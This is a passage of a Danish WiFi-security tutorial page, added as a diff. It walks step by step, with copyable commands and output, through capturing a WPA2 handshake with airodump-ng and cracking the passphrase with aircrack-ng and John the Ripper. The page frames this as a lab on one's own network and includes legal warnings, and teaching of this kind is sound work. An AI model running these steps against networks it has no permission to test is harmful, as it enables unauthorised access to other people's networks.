+          Power Management:off
+
+<span style="background-color: rgb(20, 54, 92);">wlan1mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm</span>
+          Retry short  long limit:2   RTS thr:off   Fragment thr:off
+          Power Management:off
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div>
+      <p>Vores trådløse netværkskort hed oprindeligt <span class="info">wlan1</span>. Det navn bruges, når kortet fungerer som et almindeligt WiFi-kort, der kan forbinde til et netværk.</p>
+      <p>Når netværkskortet sættes i <span class="info">monitor mode</span>, opretter systemet et nyt interface, som bruges specifikt til at overvåge trådløs trafik. For at gøre det tydeligt, at dette interface er i monitor mode, får det automatisk endelsen <span class="info">mon</span>.</p>
+      
+
+
+
+      <p>Vi kan nu begynde at fange date til at gennemføre vores attack. Mit delte netværk hedder NETGEAR59, som er det netværk jeg vil angribe.</p>
+      <p class="vigtigt">
+      Vigtigt: Det er ulovligt at angribe trådløse netværk, som man ikke selv ejer eller har tilladelse til at teste.
+      Dette vises udelukkende som en demonstration for at forklare, hvorfor stærke adgangskoder er vigtige.
+      </p> 
+     <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airodump-ng wlan1mon</span></span>
+        </code></pre>
+      </div>  
+
+        <div class="terminal linux">
+          <div class="terminal-header-linux">
+            <span class="terminal-title-output">Output</span>
+            <span class="title">ssh</span>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airodump-ng wlan1mon</span></span>
+ CH  2 ][ Elapsed: 0 s ][ 2026-06-12 10:49
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 62:53:3A:##:##:##  -57        3        0    0   6  130   WPA2 CCMP   MGT  redacted
+ 62:53:3A:##:##:##  -64        3        0    0   6  130   OPN              redacted
+ 62:53:3A:##:##:##  -60        3        0    0   6  130   WPA2 CCMP   PSK  redacted
+ <span style="background-color: rgb(20, 54, 92);">00:8E:F2:7A:2B:1C  -48        4        2    0   9  270   WPA2 CCMP   PSK  NETGEAR59</span>
+ 34:98:B5:##:##:##  -16        3        0    0  11  130   WPA2 CCMP   PSK  redacted
+Quitting...
+
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div>
+      <p>Tryk <kbd>CTRL</kbd>+<kbd>C</kbd> for at afbryde angrebet.</p>
+      <p>Lig mærke til BSSID og CH på den enhed vi vil angribe. Kopier BSSID for vores Access Point (NETGEAR59).</p>
+      <p class="vigtigt">Dette er det øjeblik, hvor vi vælger ét netværk ud af mange.
+Alt herefter er målrettet dette ene Access Point.</p>
+      
+
+
+      <div id="aireplay_handshake" class="__chapter_menu_subheader_1">
+        <h3>4-way handshake</h3>
+      </div>
+      <p>I dette afsnit fokuserer vi på at observere den proces, der sker, når en enhed opretter forbindelse til et trådløst netværk. Når en telefon eller computer kobler sig på et WiFi-netværk, gennemfører enheden og routeren det, der kaldes et 4-way handshake.</p>
+      <p>4-way handshake er den autentificeringsproces, hvor:</p>
+      <ul>
+        <li>enheden og routeren bekræfter, at de begge kender netværkets adgangskode</li>
+        <li>der oprettes en krypteret forbindelse</li>
+        <li>selve adgangskoden aldrig sendes direkte</li>
+      </ul>
+      <div class="frame-container-center">
+        <figure>
+          <img class="center-image" src="images/EAPOL.png" alt="Diagram representing 4-way handshake" width=100%>
+          <figcaption>4-way handshake</figcaption>
+        </figure>
+      </div>
+      <p>Det er denne proces, vi forsøger at opfange som data, fordi den indeholder de oplysninger, der viser, at en korrekt nøgle er blevet brugt – ikke hvad nøglen er.</p>
+      
+      <p>Vi vil nu lave et specefikt angreb på vores AP (NETGEAR59). Når en anden enhed kobler sig på NETGEAR59, kan vi fange "the 4 way handshake" og vi kan derefter knække nøglen.</p>
+
+      <p>Her skal vi bruge BSSID og CH (Channel), som vi noterede os tidligere.</p>
+      <p>Nu skal vi vente på, at en enhed tilkobler sig netværket. Derved kan vi fange et "4 way handshake".</p>
+
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airodump-ng wlan1mon --bssid 00:8E:F2:7A:2B:1C --channel 9 -w NETGEAR59</span></span>
+        </code></pre>
+      </div> 
+
+      <div class="forklaring">
+        <p>Forklaring</p>
+        <ul>
+          <li>--bssid → Bruges til at udvælge ét specifikt access point ved hjælp af dets unikke MAC-adresse.
+            Selvom flere netværk kan have samme navn (SSID), er BSSID altid unik og sikrer, at vi kun observerer trafik fra det ønskede access point.
+          </li>
+
+          <li>--channel → Angiver hvilken WiFi-kanal der observeres.
+            Trådløse netværk kommunikerer på bestemte frekvenser, og ved kun at lytte på én kanal reduceres støj fra andre netværk og analysen bliver mere præcis.
+          </li>
+
+          <li>-w → Angiver navnet på det datasæt (filer), hvor den observerede netværkstrafik gemmes.
+            Dataene bruges efterfølgende til analyse af, hvordan autentificering og sikker forbindelse fungerer.
+          </li>
+        </ul>
+      </div>  
+
+      <p>Outputtet er to-delt:</p>
+      <ul>
+        <li>Access point</li>
+        <li>Stationer</li>
+      </ul>
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="terminal-title-output">Output (Access point)</span>
+          <span class="title">ssh</span>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airodump-ng wlan1mon --bssid 00:8E:F2:7A:2B:1C --channel 9 -w NETGEAR59</span></span>
+10:50:46  Created capture file NETGEAR59-01.cap.
+
+CH  9 ][ Elapsed: 36 s ][ 2026-06-12 10:51 ][ WPA handshake: 00:8E:F2:7A:2B:1C
+
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+00:8E:F2:7A:2B:1C  -28  96      357      290   43   9  270   WPA2 CCMP   PSK  NETGEAR59
+...
+
+</code></pre>
+      </div>
+      <div class="forklaring">
+        <p>Forklaring</p>
+        <ul>
+          <li>BSSID → Den unikke hardwareadresse (MAC-adresse) på access pointet.
+          </li>
+
+          <li>PWR → Signalstyrken mellem access pointet og vores netværkskort. Jo tættere på 0, jo stærkere signal (−28 er meget stærkt).
+          </li>
+
+          <li>Beacons → Antallet af datapakker, der er observeret på netværket.
+          </li>
+
+          <li>CH (Channel) → Den kanal, netværket sender på (her kanal 9).
+          </li>
+          
+          <li>ENC / CIPHER / AUTH → Viser, at netværket bruger:
+            <ul>
+              <li>WPA2-kryptering</li>
+              <li>CCMP (AES) krypteringsmetode</li>
+              <li>PSK (fælles adgangskode)</li>
+            </ul>
+          </li>
+          
+          <li>ESSID → Netværkets navn: NETGEAR59
+          </li>
+        </ul>
+      </div> 
+
+
+
+
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="terminal-title-output">Output (Stationer)</span>
+          <span class="title">ssh</span>
+      </div>
+      <pre><code>...
+
+BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+00:8E:F2:7A:2B:1C  48:A4:72:##:##:##  -20    1e-54e     0      294  EAPOL
+Quitting...
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div> 
+      <div class="forklaring">
+        <p>Forklaring</p>
+        <ul>
+          <li>STATION → MAC-adressen på en klient (fx en mobil, computer eller tablet).
+          </li>
+
+          <li>PWR → Signalstyrken mellem klienten og vores netværkskort.
+          </li>
+
+          <li>Frames → Antallet af datapakker, der er observeret fra klienten.
+          </li>
+
+          <li>Notes: EAPOL → Dette er det vigtigste punkt - Står for Extensible Authentication Protocol over LAN..
+          <br>Når der står EAPOL ud for en station, betyder det, at en enhed er i gang med at autentificere sig på netværket.
+          </li>
+        </ul>
+      </div>  
+      <p>Vi venter på, at en "STATION" forbinder sig til netværket, så vi kan observere det digitale “håndtryk”, der sikrer forbindelsen. Det bruges til at forstå, hvordan WiFi beskytter data – og hvorfor stærke adgangskoder er vigtige.</p>
+      <p>Når vi ser EAPOL under Notes, har vi opfanget det digitale håndtryk.</p>
+      <p>Tryk <kbd>CTRL</kbd>+<kbd>C</kbd> for at afbryde angrebet.</p>
+
+
+
+
+      <p>I terminalen kan vi nu bruge <span class="code-ex">ls</span> til at liste filerne - her burde vi gerne se flere med navnet <span class="info">NETGEAR59-xx</span>.</p>
+      <div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">ls</span></span>
+        </code></pre>
+      </div>  
+
+        <div class="terminal linux">
+          <div class="terminal-header-linux">
+            <span class="terminal-title-output">Output</span>
+            <span class="title">ssh</span>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">ls</span></span>
+Desktop    Music             NETGEAR59-01.kismet.csv     Public     Videos
+Documents  NETGEAR59-01.cap  NETGEAR59-01.kismet.netxml  Pictures   Templates 
+Downloads  NETGEAR59-01.csv  NETGEAR59-01.log.csv        Projects   
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div>
+      <p>.cap-filen er den eneste fil, der indeholder den komplette rå kommunikation mellem enhed og access point.</p>
+
+      <p>Når et interface er i monitor mode, lytter det passivt til al trådløs trafik i området og kan ikke bruges som et normalt netværkskort.
+Ved at stoppe monitor mode bliver netværkskortet sat tilbage i managed mode, så det igen kan bruges til almindelig netværksforbindelse</p>
+      <p>Kommandoen nednefor bruges til at afslutte monitor mode på det trådløse netværksinterface.</p>
+
+<div class="terminal linux">
+        <div class="terminal-header-linux">
+          <span class="dot red"></span>
+          <span class="dot yellow"></span>
+          <span class="dot green"></span>
+          <span class="terminal-title"></span>
+          <div class="title">
+            <span>ssh</span>
+            <button class="copy-btn">Copy</button>
+          </div>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airmon-ng stop wlan1mon</span></span>
+        </code></pre>
+      </div>  
+
+        <div class="terminal linux">
+          <div class="terminal-header-linux">
+            <span class="terminal-title-output">Output</span>
+            <span class="title">ssh</span>
+        </div>
+        <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo airmon-ng stop wlan1mon</span></span>
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           iwlwifi         Intel Corporation Centrino Ultimate-N 6300 (rev 35)
+phy1    wlan1mon        rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211 station mode vif enabled on [phy1]wlan1)
+                (mac80211 monitor mode vif disabled for [phy1]wlan1mon)
+
+
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+      </div> 
+
+    </section>
+  </section>
+
+  
+
+
+
+<!-- ######################## NEW CHAPTER ###################################-->
+<!-- ######################## NEW CHAPTER ###################################-->
+<!-- ######################## NEW CHAPTER ###################################-->
+  <section class="content new-chapter">
+    <div id="aircrack-ng" class="__chapter_menu_container">
+      <h2 class="menu-chapter-title chapter-title">Knæk koden</h2>
+    </div>
+    <div id="aircrack-ng-psk" class="__chapter_menu_subheader_1">
+      <h3>Passwordliste</h3>
+    </div>
+    <p>For at kunne brute force .cap-filen og finde nøglen (koden) til vores WiFi, skal vi først have en liste af keys (dictionary attack). Her kan vi evt. bruge <a href="https://matt-connors.medium.com/the-security-breach-that-rocked-the-world-a-reflection-on-rockyou-6d636bd84516" target="_blank">RockYou</a>. eller <a href="uploads/passwdlist.txt" download>passwdlist.txt</a> under resourcer.</p>   
+    <p class="info">For at vores brute force lykkes, er det vigtigt, at password-filen indeholder det korrekte password (key).</p>
+    <div id="aircrack-ng-crack" class="__chapter_menu_subheader_1">
+      <h3>Knæk koden med Aircrack-ng</h3>
+    </div>
+
+      
+    <div class="terminal linux">
+    <div class="terminal-header-linux">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+      <span class="terminal-title"></span>
+      <div class="title">
+        <span>ssh</span>
+        <button class="copy-btn">Copy</button>
+      </div>
+    </div>
+    <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo aircrack-ng -b 00:8E:F2:7A:2B:1C -w passwdlist.txt NETGEAR59-01.cap</span></span>
+      </code></pre>
+    </div>  
+
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="terminal-title-output">Output</span>
+        <span class="title">ssh</span>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">sudo aircrack-ng -b 00:8E:F2:7A:2B:1C -w passwdlist.txt NETGEAR59-01.cap</span></span>
+[sudo] password for kali:
+Reading packets, please wait...
+Opening NETGEAR59-01.cap
+Resetting EAPOL Handshake decoder state.
+Read 777 packets.
+
+1 potential targets
+
+                               Aircrack-ng 1.7
+
+      [00:00:00] 2/5 keys tested (15.15 k/s)
+
+      Time left: 0 seconds                                      40.00%
+
+   <span style="background-color: rgb(20, 54, 92);">                      KEY FOUND! [ password1234 ]                      </span>
+
+
+      Master Key     : 5E E1 E8 C5 9A C0 39 7A 20 88 6A FB 34 A1 E3 F3
+                       B7 BE 0A 36 72 B0 EA 35 47 AE D4 2E D4 55 4D 58
+
+      Transient Key  : 9F 02 71 D7 E0 A3 04 0C 88 50 1F 82 D6 F3 5D BA
+                       6D 15 C5 89 75 74 AF EE 6C 52 85 44 2C D7 14 AB
+                       F7 AA 7A 67 3A 53 47 68 7F 8F F5 64 29 56 3C 33
+                       79 B6 B2 B1 D1 30 67 AA 45 0F BB 34 00 00 00 00
+
+      EAPOL HMAC     : BA 32 6B 1B E6 FE 1D 30 40 3A 6A 85 F1 35 03 0E
+
+
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+    </div> 
+
+    <p> Vi har nu fundet koden til vores WiFi!</p>
+ 
+  </section>
+
+<!-- ######################## NEW CHAPTER ###################################-->
+<!-- ######################## NEW CHAPTER ###################################-->
+<!-- ######################## NEW CHAPTER ###################################-->
+  <section class="content new-chapter">
+    <div id="extra" class="__chapter_menu_container">
+      <h2 class="menu-chapter-title chapter-title">Ekstra</h2>
+    </div>
+
+    <div id="extra-crack" class="__chapter_menu_subheader_1">
+      <h3>Knæk koden med John the Ripper</h3>
+    </div>
+    <p>Vi kan også knække koden med John the Ripper eller Hashcat.</p>
+    <p>Her skal vi først konvertere vores <span class="info">.cap</span>-fil om til <i>Hashcat</i> <span class="info">.hccapx</span> format, før vi kan udlede WPA PMK (Pairwise Master Key).</p>
+    <p>Konvertere .cap filen og udtræk det digitalehåndtryk med <span class="code-ex">aircrack-ng</span></p>
+    
+
+
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="terminal-title"></span>
+        <div class="title">
+          <span>ssh</span>
+          <button class="copy-btn">Copy</button>
+        </div>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">aircrack-ng -j NETGEAR59-01 NETGEAR59-01.cap</span></span>
+      </code></pre>
+    </div> 
+
+    <p>Konvertere .hccapx formatet til </p>
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="terminal-title"></span>
+        <div class="title">
+          <span>ssh</span>
+          <button class="copy-btn">Copy</button>
+        </div>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">hccapx2john NETGEAR59-01.hccapx > NETGEAR59-01.john</span></span>
+      </code></pre>
+    </div> 
+
+        <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="terminal-title"></span>
+        <div class="title">
+          <span>ssh</span>
+          <button class="copy-btn">Copy</button>
+        </div>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">john --format=wpapsk --wordlist=./passwdlist.txt NETGEAR59-01.john</span></span>
+      </code></pre>
+    </div>
+    
+    
+    <div class="terminal linux">
+      <div class="terminal-header-linux">
+        <span class="terminal-title-output">Output</span>
+        <span class="title">ssh</span>
+      </div>
+      <pre><code><span class="rpi"><span class="dir">~</span>
+<span class="codebgn"></span><span class="command">john --format=wpapsk --wordlist=./passwdlist.txt NETGEAR59-01.john
+</span></span>
+Using default input encoding: UTF-8
+Loaded 33 password hashes with no different salts (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 128/128 AVX 4x])
+Will run 4 OpenMP threads
+Note: Minimum length forced to 8 by format
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span <span style="color: rgb(248, 202, 73)">password1234     (NETGEAR59)</span>
+1g 0:00:00:00 DONE (2026-06-19 10:51) 2.702g/s 437.8p/s 437.8c/s 14448C/s familyguy..twilight1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+
+<span class=rpi><span class="dir">~</span></span><span class="codebgn"></span>
+</code></pre>
+    </div> 
+
+
+    <div id="extra-wireshark" class="__chapter_menu_subheader_1">
+      <h3>EAPOL i Wireshark</h3>
+    </div>
+    <div class="frame-container-center">
+      <figure>
+        <img class="center-image" src="images/wireshark.png" alt="Wireshark 4-way handshake" width=100%>
+        <figcaption>4-way handshake i Wireshark</figcaption>
+      </figure>
+    </div>
+<section>
+  <h3>Analyse af netværkstrafik i Wireshark</h3>
+
+  <p>
+    Wireshark er et netværksanalyseværktøj, der bruges til at undersøge, hvordan data bevæger sig gennem et netværk.
+    I dette forløb anvender vi Wireshark til at analysere en optaget netværksfil (.cap) fra et trådløst netværk,
+    udelukkende med det formål at forstå, hvordan WiFi-sikkerhed fungerer.
+  </p>
+
+  <p>
+    Når en enhed kobler sig på et WPA2-beskyttet netværk, gennemføres der en autentificeringsproces kaldet
+    <em>4-way handshake</em>. Denne proces kan i Wireshark genkendes som en række pakker med protokollen
+    <strong>EAPOL</strong> (Extensible Authentication Protocol over LAN).
+  </p>
+
+  <p>
+    I Wireshark kigger vi derfor efter:
+  </p>
+
+  <ul>
+    <li>EAPOL-pakker i pakkelisten</li>
+    <li>Kommunikation mellem den samme klient (enhed) og access point</li>
+    <li>Flere EAPOL-pakker, der ligger tæt i tid</li>
+  </ul>
+
+  <p>
+    Når disse pakker er observeret, har vi set den digitale “håndtryksproces”, hvor netværket og enheden bekræfter,
+    at de kender den samme adgangskode – uden at adgangskoden sendes direkte.
+  </p>
+
+  <p>
+    Formålet med analysen er ikke at dekryptere eller aflæse indhold, men at opnå forståelse for, hvordan
+    trådløse netværk beskytter sig mod uautoriseret adgang.
+  </p>
+
+  <p class="vigtigt">
+    Vigtigt: Analyse af netværkstrafik må kun foretages på netværk, som man selv ejer eller har fået udtrykkelig
+    tilladelse til at undersøge. Misbrug af netværksanalyseværktøjer er ulovligt.
+  </p>
+</section>
+  </section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- FOOTER START --> 
+  <footer>
+    <a class="svglink" target="_blank" href="https://github.com/AleksHolland84">
+      <svg arole="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12">
+        </path>
+      </svg>
+    </a>
+    <br><br>
+     <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
+  </footer>
+  <!-- FOOTER END --> 
+  
+
+</div><!-- main-content-wrapper end-->
+</div>
+<script src='scripts/script.js'></script>
+<script src='scripts/menu.js'></script>
+</body>
+</html>
